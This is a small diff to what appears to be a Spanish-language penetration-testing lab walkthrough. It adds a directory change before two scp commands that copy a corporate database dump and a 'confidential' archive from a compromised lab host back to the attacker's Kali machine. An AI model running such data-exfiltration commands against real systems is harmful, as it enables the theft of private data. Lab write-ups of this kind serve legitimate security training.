@@ -562,6 +562,7 @@ Para llevar los archivos a la máquina atacante, se puede usar `scp` de vuelta:
 
 ```bash
 # Desde external-kali
+cd ~/lab/captures
 scp ftpoperator@192.168.57.10:/tmp/corporativedb.sql .
 scp ftpoperator@192.168.57.10:/tmp/confidential.tar.gz .
 ```
